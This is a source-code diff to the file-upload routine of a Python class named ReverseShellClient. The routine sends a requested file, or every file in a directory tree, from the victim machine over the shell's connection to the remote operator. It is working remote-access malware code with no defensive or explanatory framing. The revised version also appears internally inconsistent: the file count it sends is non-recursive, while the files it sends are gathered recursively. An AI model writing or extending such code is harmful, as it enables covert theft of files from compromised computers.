@@ -115,28 +115,22 @@ class ReverseShellClient:
         if not os.path.exists(local_path):
             self.comm.send(b"error: No such file or directory")
             return
-        self.comm.send(b"ready*+~")
+        self.comm.send(b"ready")
 
         if os.path.isdir(local_path):
-            self.comm.send(b"*is_dir+~")
-            all_files = []
-            for root, _, files in os.walk(local_path):
-                for file in files:
+            self.comm.send(b"dir~%*")
+            files = os.listdir(local_path)
+            self.comm.send(struct.pack('>I', len(files)))
+            for root, _, filenames in os.walk(local_path):
+                for file in filenames:
                     full_path = os.path.join(root, file)
                     rel_path = os.path.relpath(full_path, local_path)
-                    all_files.append(rel_path)
-            self.comm.sock.sendall(struct.pack('>I', len(all_files)))
-            print(f"files sent {len(all_files)}")
-
-            for rel_path in all_files:
-                self.comm.send(rel_path.encode())
-                with open(os.path.join(local_path, rel_path), 'rb') as f:
-                    while True:
-                        chunk = f.read(4096)
-                        if not chunk:
-                            break
-                        self.comm.send(chunk)
-                self.comm.send(b"done+*<+")
+                    print(f"Sending file: {rel_path} (len: {len(rel_path)})")
+                    self.comm.send(rel_path.encode())
+                    self.file_send(full_path)
+        else:
+            self.comm.send(b"file~%*")
+            self.file_send(local_path)
 
                     
     def kill_connection(self):
